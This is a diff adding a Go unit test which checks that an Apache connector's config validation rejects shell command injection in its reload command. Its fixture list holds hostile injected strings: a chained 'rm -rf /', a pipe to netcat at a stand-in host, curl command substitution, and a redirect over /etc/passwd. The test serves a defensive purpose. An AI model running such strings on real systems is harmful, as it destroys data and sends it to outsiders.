@@ -198,3 +198,45 @@ func TestApacheConnector_ValidateDeployment(t *testing.T) {
 		}
 	})
 }
+
+// Phase 7 SEC-H2 (2026-05-14): pin the config-time injection guard.
+// Every shell metacharacter that ValidateShellCommand rejects MUST
+// surface as a ValidateConfig error before the connector ever
+// reaches defaultRunCommand. Pre-Phase-7 a malicious string would
+// have been caught at the same gate; post-Phase-7 the same string
+// is ALSO rejected at exec-time via SplitShellCommand
+// (defense-in-depth) — but the config layer is the load-bearing
+// check that prevents the persisted config from carrying an
+// exploit payload in the first place.
+func TestApacheConnector_ValidateConfig_RejectsCommandInjection(t *testing.T) {
+	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
+	ctx := context.Background()
+	tmpDir := t.TempDir()
+	certPath := filepath.Join(tmpDir, "cert.pem")
+	if err := os.WriteFile(certPath, []byte("cert"), 0644); err != nil {
+		t.Fatalf("setup cert: %v", err)
+	}
+
+	maliciousCommands := []string{
+		"apachectl graceful; rm -rf /",         // semicolon-chain
+		"apachectl graceful | nc evil.example", // pipe
+		"apachectl graceful $(curl evil)",      // command substitution
+		"apachectl graceful `whoami`",          // backtick substitution
+		"apachectl graceful & malware",         // background spawn
+		"apachectl graceful > /etc/passwd",     // output redirection
+	}
+
+	for _, cmd := range maliciousCommands {
+		t.Run(cmd, func(t *testing.T) {
+			rawCfg, _ := json.Marshal(apache.Config{
+				CertPath:        certPath,
+				ReloadCommand:   cmd,
+				ValidateCommand: "apachectl configtest",
+			})
+			c := apache.New(nil, logger)
+			if err := c.ValidateConfig(ctx, rawCfg); err == nil {
+				t.Errorf("ValidateConfig accepted malicious ReloadCommand %q; want injection-rejection error", cmd)
+			}
+		})
+	}
+}
